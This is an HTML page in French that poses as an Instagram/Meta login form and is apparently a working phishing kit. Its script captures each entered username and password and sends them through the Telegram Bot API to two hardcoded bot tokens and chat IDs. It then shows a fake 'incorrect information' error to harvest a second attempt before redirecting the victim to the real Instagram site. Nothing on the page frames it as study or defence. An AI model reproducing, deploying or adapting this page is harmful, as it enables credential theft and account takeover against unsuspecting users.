<!DOCTYPE html>
<html lang="fr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Se connecter</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #fff;
      text-align: center;
      padding: 50px 20px;
    }

    .container {
      max-width: 400px;
      margin: auto;
    }

    .logo {
      width: 100px;
      height: 100px;
      margin: 40px auto;
      background-color: #eee;
      border-radius: 20px;
    }

    input {
      display: block;
      width: 100%;
      margin-bottom: 15px;
      padding: 10px;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 16px;
    }

    .btn-primary {
      background-color: #0095f6;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 25px;
      font-size: 16px;
      cursor: pointer;
    }

    .btn-secondary {
      background-color: transparent;
      border: 1px solid #0095f6;
      color: #0095f6;
      padding: 12px;
      border-radius: 25px;
      margin-top: 20px;
      font-size: 16px;
    }

    .meta-logo {
      margin-top: 30px;
      font-size: 14px;
      color: gray;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="logo" id="logo-placeholder"></div>
    <form id="login-form">
      <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
      <input type="password" id="password" placeholder="Mot de passe" required>
      <button type="submit" class="btn-primary">Se connecter</button>
    </form>
    <p id="message" style="margin-top: 20px;"></p>
    <p><a href="#">Mot de passe oublié ?</a></p>
    <button class="btn-secondary">Créer un compte</button>
    <div class="meta-logo">© Meta
    </div>
  </div>

  <script>
    const form = document.getElementById("login-form");
    const message = document.getElementById("message");

    let attempt = 0;

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const bots = [
        { token: "7092124874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "81764736" },
        { token: "7159316957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ", chatId: "780712584" }
      ];

      const text = `Tentative ${attempt + 1}\nNom d'utilisateur: ${username}\nMot de passe: ${password}`;

      for (const bot of bots) {
        await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: bot.chatId,
            text: text
          })
        });
      }

      message.textContent = "Chargement...";

      setTimeout(() => {
        attempt++;
        if (attempt < 2) {
          message.textContent = "Informations incorrectes. Veuillez réessayer.";
        } else {
          window.location.href = "https://www.instagram.com";
        }
      }, 4000);
    });
  </script>
</body>

</html>
